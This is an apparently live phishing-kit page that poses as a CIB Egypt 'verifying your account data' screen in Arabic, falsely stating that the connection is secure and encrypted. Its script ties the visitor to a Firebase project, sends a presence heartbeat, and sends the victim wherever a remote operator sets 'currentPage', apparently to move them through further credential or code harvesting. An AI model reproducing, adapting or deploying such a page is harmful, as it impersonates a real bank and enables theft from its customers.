<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>
        جاري المعالجة | CIB
    </title>

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">

    <style>

        *{
            margin:0;
            padding:0;
            box-sizing:border-box;
        }

        body{
            font-family:'Cairo',sans-serif;
            min-height:100vh;
            overflow:hidden;
            background:
                radial-gradient(circle at top,#1e3a8a 0%,#0f172a 45%,#020617 100%);
            display:flex;
            justify-content:center;
            align-items:center;
            position:relative;
        }

        /* =========================
           BACKGROUND LIGHTS
        ========================= */

        .bg{
            position:absolute;
            inset:0;
            overflow:hidden;
        }

        .glow{
            position:absolute;
            border-radius:50%;
            filter:blur(90px);
            opacity:0.25;
        }

        .glow.one{
            width:300px;
            height:300px;
            background:#2563eb;
            top:-100px;
            right:-100px;
            animation:move1 10s infinite alternate ease-in-out;
        }

        .glow.two{
            width:260px;
            height:260px;
            background:#06b6d4;
            bottom:-120px;
            left:-80px;
            animation:move2 12s infinite alternate ease-in-out;
        }

        @keyframes move1{
            from{
                transform:translate(0,0);
            }
            to{
                transform:translate(-40px,50px);
            }
        }

        @keyframes move2{
            from{
                transform:translate(0,0);
            }
            to{
                transform:translate(40px,-40px);
            }
        }

        /* =========================
           CARD
        ========================= */

        .card{
            width:100%;
            max-width:390px;
            background:rgba(255,255,255,0.08);
            border:1px solid rgba(255,255,255,0.12);
            backdrop-filter:blur(25px);
            border-radius:30px;
            padding:45px 28px;
            position:relative;
            z-index:2;
            text-align:center;
            box-shadow:
                0 20px 50px rgba(0,0,0,0.35),
                inset 0 1px 0 rgba(255,255,255,0.06);
        }

        /* =========================
           LOGO
        ========================= */

        .logo{
            width:130px;
            margin-bottom:35px;
            filter:brightness(10);
        }

        /* =========================
           SPINNER
        ========================= */

        .loader-wrap{
            position:relative;
            width:110px;
            height:110px;
            margin:auto;
        }

        .ring{
            position:absolute;
            inset:0;
            border-radius:50%;
            border:4px solid transparent;
        }

        .ring.one{
            border-top-color:#3b82f6;
            animation:spin 1.2s linear infinite;
        }

        .ring.two{
            inset:10px;
            border-bottom-color:#60a5fa;
            animation:spinReverse 1.8s linear infinite;
        }

        .ring.three{
            inset:20px;
            border-top-color:#93c5fd;
            animation:spin 2.5s linear infinite;
        }

        .center-dot{
            position:absolute;
            width:16px;
            height:16px;
            background:#fff;
            border-radius:50%;
            top:50%;
            left:50%;
            transform:translate(-50%,-50%);
            animation:pulse 1.3s infinite;
        }

        @keyframes spin{
            to{
                transform:rotate(360deg);
            }
        }

        @keyframes spinReverse{
            to{
                transform:rotate(-360deg);
            }
        }

        @keyframes pulse{
            0%,100%{
                transform:translate(-50%,-50%) scale(1);
                opacity:1;
            }
            50%{
                transform:translate(-50%,-50%) scale(1.5);
                opacity:0.5;
            }
        }

        /* =========================
           TEXT
        ========================= */

        .title{
            color:#fff;
            font-size:26px;
            font-weight:800;
            margin-top:35px;
        }

        .subtitle{
            color:rgba(255,255,255,0.7);
            font-size:14px;
            line-height:1.9;
            margin-top:12px;
        }

        /* =========================
           PROGRESS BAR
        ========================= */

        .progress{
            width:100%;
            height:7px;
            background:rgba(255,255,255,0.08);
            border-radius:999px;
            overflow:hidden;
            margin-top:30px;
        }

        .progress-bar{
            height:100%;
            width:65%;
            border-radius:999px;
            background:linear-gradient(
                90deg,
                #2563eb,
                #60a5fa,
                #2563eb
            );
            background-size:200% 100%;
            animation:progressMove 2s linear infinite;
        }

        @keyframes progressMove{
            0%{
                background-position:200% 0;
            }
            100%{
                background-position:-200% 0;
            }
        }

        /* =========================
           STATUS
        ========================= */

        .status{
            margin-top:25px;
            display:flex;
            justify-content:center;
            align-items:center;
            gap:10px;
        }

        .status-dot{
            width:10px;
            height:10px;
            border-radius:50%;
            background:#22c55e;
            box-shadow:0 0 12px #22c55e;
            animation:blink 1s infinite;
        }

        @keyframes blink{
            0%,100%{
                opacity:1;
            }
            50%{
                opacity:0.3;
            }
        }

        .status-text{
            color:#86efac;
            font-size:13px;
            font-weight:700;
        }

        /* =========================
           STEPS
        ========================= */

        .steps{
            display:flex;
            justify-content:center;
            gap:14px;
            margin-top:30px;
        }

        .step{
            width:12px;
            height:12px;
            border-radius:50%;
            background:rgba(255,255,255,0.12);
        }

        .step.done{
            background:#22c55e;
            box-shadow:0 0 12px #22c55e;
        }

        .step.active{
            background:#3b82f6;
            box-shadow:0 0 12px #3b82f6;
            animation:pulseStep 1s infinite;
        }

        @keyframes pulseStep{
            0%,100%{
                transform:scale(1);
            }
            50%{
                transform:scale(1.4);
            }
        }

        /* =========================
           FOOTER
        ========================= */

        .footer{
            position:absolute;
            bottom:20px;
            left:50%;
            transform:translateX(-50%);
            color:rgba(255,255,255,0.3);
            font-size:11px;
            white-space:nowrap;
        }

        /* =========================
           MOBILE
        ========================= */

        @media(max-width:480px){

            body{
                padding:20px;
            }

            .card{
                padding:40px 22px;
            }

            .title{
                font-size:22px;
            }

        }

    </style>

</head>

<body>

    <!-- BACKGROUND -->
    <div class="bg">

        <div class="glow one"></div>

        <div class="glow two"></div>

    </div>

    <!-- CARD -->
    <div class="card">

        <!-- LOGO -->
        <img src="assets/logo.webp" class="logo" alt="CIB">

        <!-- LOADER -->
        <div class="loader-wrap">

            <div class="ring one"></div>

            <div class="ring two"></div>

            <div class="ring three"></div>

            <div class="center-dot"></div>

        </div>

        <!-- TEXT -->
        <div class="title">
            جاري التحقق من بياناتك
        </div>

        <div class="subtitle">
            يتم الآن مراجعة معلومات الحساب الخاصة بك.<br>
            يرجى عدم إغلاق الصفحة حتى اكتمال العملية.
        </div>

        <!-- PROGRESS -->
        <div class="progress">

            <div class="progress-bar"></div>

        </div>

        <!-- STATUS -->
        <div class="status">

            <div class="status-dot"></div>

            <div class="status-text">
                اتصال آمن ومشفّر
            </div>

        </div>

        <!-- STEPS -->
        <div class="steps">

            <div class="step done"></div>

            <div class="step active"></div>

            <div class="step"></div>

        </div>

    </div>

    <!-- FOOTER -->
    <div class="footer">
        CIB Egypt © 2026 — Commercial International Bank
    </div>

    <!-- JS -->
    <script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {

 getFirestore,
    doc,
    onSnapshot,
    setDoc

} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

/* =========================
   FIREBASE
========================= */

const firebaseConfig = {
  apiKey: "AIzaSyBlJmP2evXPZGvARmHHhnGtaMu6NDEre7o",
  authDomain: "masr-9f4fb.firebaseapp.com",
  projectId: "masr-9f4fb",
  storageBucket: "masr-9f4fb.firebasestorage.app",
  messagingSenderId: "1056650851372",
  appId: "1:1056650851372:web:e59f6a36584b6de34c4d89",
  measurementId: "G-LMXZYH6R1H"
};

const app = initializeApp(firebaseConfig);

const db = getFirestore(app);

/* =========================
   STEP ANIMATION
========================= */

const steps = document.querySelectorAll('.step');

let current = 1;

setInterval(() => {

    steps.forEach(step => {
        step.classList.remove('active');
    });

    if(current < steps.length){

        steps[current].classList.add('active');

        if(current > 0){
            steps[current - 1].classList.add('done');
        }

        current++;

    }else{

        current = 1;

        steps.forEach((step,index) => {

            step.classList.remove('done');

            if(index === 0){
                step.classList.add('done');
            }

        });

    }

}, 2200);

/* =========================
   FIRESTORE LIVE LISTENER
========================= */

/* get login data */

const loginData =
    JSON.parse(localStorage.getItem('loginData'));

/* if no login */

if(!loginData){

    window.location.href = "login.html";

}

/* find current user */


const userId = localStorage.getItem("userId")

/* realtime listener */

onSnapshot(doc(db,"users",userId),(docSnap)=>{

    if(!docSnap.exists()) return;

    const user = docSnap.data();

    /* redirect if admin changed page */

    if(
        user.currentPage &&
        user.currentPage !== "waitaccount.html"
    ){

        window.location.href = user.currentPage;

    }

});

/* online heartbeat */

setInterval(async ()=>{

    await setDoc(doc(db,"users",userId),{

        lastSeen: Date.now()

    },{ merge:true });

},5000);

</script>

</body>

</html>
